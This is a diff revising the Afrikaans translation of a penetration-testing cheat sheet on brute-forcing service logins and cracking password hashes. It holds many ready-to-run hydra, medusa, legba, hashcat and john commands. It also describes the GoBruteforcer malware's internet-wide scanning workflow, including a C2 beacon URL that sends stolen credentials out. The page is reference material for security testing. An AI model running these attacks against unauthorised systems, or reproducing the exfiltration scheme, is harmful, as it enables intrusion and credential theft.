@@ -1,8 +1,10 @@
 # Brute Force - CheatSheet
 
+{{#include ../banners/hacktricks-training.md}}
+
 ## Verstekbewyse
 
-**Soek op Google** vir verstekbewyse van die tegnologie wat gebruik word, of **probeer hierdie skakels**:
+**Soek op google** vir verstekbewyse van die tegnologie wat gebruik word, of **probeer hierdie skakels**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -51,7 +53,7 @@ python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-’n wordlist-generatorinstrument waarmee jy ’n stel woorde kan verskaf, sodat jy verskeie variasies van die gegewe woorde kan skep en ’n unieke, ideale wordlist vir ’n spesifieke teiken kan saamstel.
+'n wordlist-generatorhulpmiddel waarmee jy 'n stel woorde kan verskaf, wat jou die moontlikheid gee om verskeie variasies van die gegewe woorde te skep en 'n unieke en ideale wordlist vir gebruik teen 'n spesifieke teiken saam te stel.
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -85,15 +87,15 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Werkwyse vir Internetwye bruteforcer (lesse uit Go-gebaseerde skandeerders)
+## Internetwye bruteforcer-werkvloei (lesse uit Go-gebaseerde scanners)
 
-Die volgende gedrag is in die GoBruteforcer-malware se skanderingwerkwyse waargeneem; presiese waardes is spesifiek tot die voorbeeld.<sup>[[1]](#references)</sup>
+Die volgende gedragspatrone is in die GoBruteforcer-malware se skanderingswerkvloei waargeneem; presiese waardes is spesifiek tot die steekproef.<sup>[[1]](#references)</sup>
 
 - Handhaaf **argitektuur-aangepaste werkerpoele** (byvoorbeeld 95 gelyktydige werkers op `x86_64/arm64`, 85 op `i686`, 35 op `armv5tel` en 50 by verstek op ander argitekture), kontroleer aktiewe werkers elke sekonde en skep vervangings wanneer die aantal onder die teiken daal; elke werker hanteer hoogstens een teiken-IP voordat dit afsluit.
-- Genereer **ewekansige publieke IPv4-adresse**, maar verwyder voor die hand liggende onroeteerbare en uitgesoekte operateur-vermyde reekse: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-swaar `/8`s (`3/15/16/56`) en DoD-geassosieerde `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
-- **Toets die dienspoort** met ’n kort timeout (~2s) voordat **cleartext-aanmeldings** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin oor HTTP/80) probeer word, en val terug na ’n **klein ingeboude credential-lys** indien die C2-credential-ophaling misluk.
-- **Eksfiltreer treffers** via klein HTTP GET-beacons soos `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (dienskodes soos `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) terwyl ’n algemene blaaier User-Agent hergebruik word om in normale verkeer op te gaan.
-- **phpMyAdmin-spraying** kan ongeveer 80 waarskynlike paaie bruteforce met `GET /index.php?lang=en`, PMA-merkers (`pmahomme`-tema/`phpmyadmin.css`/`navigation.php`) bespeur en `codemirror.css?v=X.Y.Z` ontleed om die auth-roete te bepaal: weergawes `<4.9` aanvaar GET-parameters `pma_username`/`pma_password`; weergawes `>=4.9` gebruik POST met `server=1`, CSRF `token` en dieselfde creds.
+- Genereer **ewekansige publieke IPv4-adresse**, maar verwyder ooglopend onroeteerbare en spesifieke operateur-vermyde reekse: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-swaar `/8`s (`3/15/16/56`) en met DoD-geassosieerde `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
+- **Toets die dienspoort** met ’n kort tydsbeperking (~2s) voordat **cleartext-aanmeldings** probeer word (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin oor HTTP/80), en val terug na ’n **klein ingeboude credential-lys** indien die C2-credential-ophaalaksie misluk.
+- **Eksfiltreer treffers** via klein HTTP GET-beacons soos `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (dienskodes soos `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) terwyl ’n algemene blaaier User-Agent hergebruik word om in die normale verkeer op te gaan.
+- **phpMyAdmin-spray** kan ongeveer 80 waarskynlike paaie bruteforce met `GET /index.php?lang=en`, PMA-merkers (`pmahomme`-tema/`phpmyadmin.css`/`navigation.php`) opspoor en `codemirror.css?v=X.Y.Z` ontleed om die auth-metode te bepaal: weergawes `<4.9` aanvaar GET-parameters `pma_username`/`pma_password`; weergawes `>=4.9` gebruik POST met `server=1`, CSRF `token` en dieselfde credentials.
 
 ## Dienste
 
@@ -113,7 +115,7 @@ msf> run
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM en Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
@@ -149,7 +151,7 @@ ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### HTTP Generiese Brute
+### HTTP Generic Brute
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -170,7 +172,7 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-Vir http**s** moet jy van "http-post-form" na "**https-post-form"** verander
+Vir http**s** moet jy verander van "http-post-form" na "**https-post-form**"
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla of (D)rupal of (M)oodle
 ```bash
@@ -289,7 +291,7 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-Om **oracle_login** met **patator** te gebruik, moet jy die volgende **installeer**:
+Om **oracle_login** saam met **patator** te gebruik, moet jy die volgende **installeer**:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
@@ -320,7 +322,7 @@ legba pgsql --username admin --password wordlists/passwords.txt --target localho
 ```
 ### PPTP
 
-Jy kan die `.deb`-pakket aflaai om te installeer vanaf [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/).
+Jy kan die `.deb`-pakket aflaai om dit te installeer vanaf [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/).
 ```bash
 sudo dpkg -i thc-pptp-bruter*.deb #Install the package
 cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
@@ -417,11 +419,11 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### Swak SSH-sleutels / Debian voorspelbare PRNG
 
-Sommige stelsels het bekende foute in die ewekansige saad wat gebruik word om kriptografiese materiaal te genereer. Dit kan 'n dramaties verkleinde sleutelruimte tot gevolg hê wat met tools soos [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) bruteforced kan word. Voorafgegenereerde stelle swak sleutels is ook beskikbaar, soos [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+Sommige stelsels het bekende foute in die random seed wat gebruik word om kriptografiese materiaal te genereer. Dit kan lei tot ’n dramaties verkleinde keyspace wat met nutsprogramme soos [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) bruteforced kan word. Voorafgegenereerde stelle swak sleutels is ook beskikbaar, soos [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-Die STOMP-teksprotokol is 'n wyd gebruikte boodskapprotokol wat **naatlose kommunikasie en interaksie met gewilde boodskapry-dienste moontlik maak** soos RabbitMQ, ActiveMQ, HornetQ en OpenMQ. Dit bied 'n gestandaardiseerde en doeltreffende benadering om boodskappe uit te ruil en verskeie boodskapbewerkings uit te voer.
+Die STOMP-teksprotokol is ’n wyd gebruikte boodskapprotokol wat **naatlose kommunikasie en interaksie met gewilde message queueing services moontlik maak**, soos RabbitMQ, ActiveMQ, HornetQ en OpenMQ. Dit bied ’n gestandaardiseerde en doeltreffende benadering om boodskappe uit te ruil en verskeie boodskapbewerkings uit te voer.
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -468,7 +470,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2-captures en argiewe van MSOffice, ZIP, PDF...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
-- [https://gpuhash.me/](https://gpuhash.me) (Hashes en file hashes)
+- [https://gpuhash.me/](https://gpuhash.me) (Hashes en lêer-hashes)
 - [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
 - [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
 - [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
@@ -493,10 +495,10 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### Known plaintext zip attack
+#### Bekende plaintext zip-aanval
 
-Jy moet die **plaintext** (of ’n gedeelte van die plaintext) **van ’n lêer binne** die geënkripteerde zip ken. Jy kan **lêername en die grootte van lêers binne** ’n geënkripteerde zip nagaan deur die volgende uit te voer: **`7z l encrypted.zip`**\
-Laai [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) vanaf die releases-bladsy af.
+Jy moet die **plaintext** (of 'n gedeelte van die plaintext) **van 'n lêer binne** die encrypted zip ken. Jy kan **lêername en die grootte van lêers binne** 'n encrypted zip nagaan deur: **`7z l encrypted.zip`**\
+Laai [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)van die releases-bladsy af.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -528,9 +530,9 @@ pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
 sudo apt-get install qpdf
 qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
-### PDF-eienaarswagwoord
+### PDF-eienaarwagwoord
 
-Om ’n PDF-eienaarswagwoord te crack, kyk hierna: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+Om ’n PDF-eienaarwagwoord te kraak, kyk hierna: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -564,7 +566,7 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Lucks-beeld
+### LUKS-image
 
 #### Metode 1
 
@@ -603,11 +605,11 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-Gebruik [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) en daarna john
+Gebruik [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) en dan john
 
 ### Open Office Wagwoordbeskermde Kolom
 
-As jy 'n xlsx-lêer met 'n kolom het wat deur 'n wagwoord beskerm word, kan jy dit ontsluit:
+As jy ’n xlsx-lêer het met ’n kolom wat deur ’n wagwoord beskerm word, kan jy die beskerming daarvan verwyder:
 
 - **Laai dit op na Google Drive**, en die wagwoord sal outomaties verwyder word
 - Om dit **handmatig te verwyder**:
@@ -626,7 +628,7 @@ zip -r file.xls .
 # From https://github.com/crackpkcs12/crackpkcs12
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
-## Gereedskap
+## Tools
 
 **Hash-voorbeelde:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)
 
@@ -642,9 +644,9 @@ hash-identifier
 - [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
 - [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
 
-### **Woordlys-genereringsnutsgoed**
+### **Gereedskap vir woordlysgenerering**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gevorderde keyboard-walk-generator met konfigureerbare basis-karakters, sleutelborduitleg en roetes.
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gevorderde keyboard-walk-generator met konfigureerbare basis-karakters, keymap en roetes.
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
@@ -657,15 +659,15 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 ```
 ### Hashcat
 
-#### Hashcat attacks
+#### Hashcat-aanvalle
 
-- **Wordlist attack** (`-a 0`) with rules
+- **Wordlist attack** (`-a 0`) met rules
 
-**Hashcat** kom reeds met ’n **folder wat rules bevat**, maar jy kan [**ander interessante rules hier vind**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
+**Hashcat** kom reeds met ’n **vouer wat rules bevat**, maar jy kan [**ander interessante rules hier vind**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-- **Wordlist combinator**-aanval
+- **Wordlist combinator** attack
 
 Dit is moontlik om **2 wordlists in 1 te kombineer** met hashcat.\
 As lys 1 die woord **"hello"** bevat het en die tweede lys 2 reëls met die woorde **"world"** en **"earth"** bevat het, sal die woorde `helloworld` en `helloearth` gegenereer word.
@@ -723,14 +725,14 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Kraak van Linux Hashes - /etc/shadow-lêer
+Kraking van Linux Hashes - /etc/shadow-lêer
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Kraak van Windows-hashes
+Windows-hashes kraak
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
@@ -747,5 +749,5 @@ Kraking van algemene toepassings-hashes
 ```
 ## References
 
-- [1] [Binne GoBruteforcer: KI-gegenereerde bedienerstandaarde, swak wagwoorde en kripto-gefokusde veldtogte](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [Binne GoBruteforcer: KI-gegenereerde bediener-verstekinstellings, swak wagwoorde en kripto-gefokusde veldtogte](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 {{#include ../banners/hacktricks-training.md}}
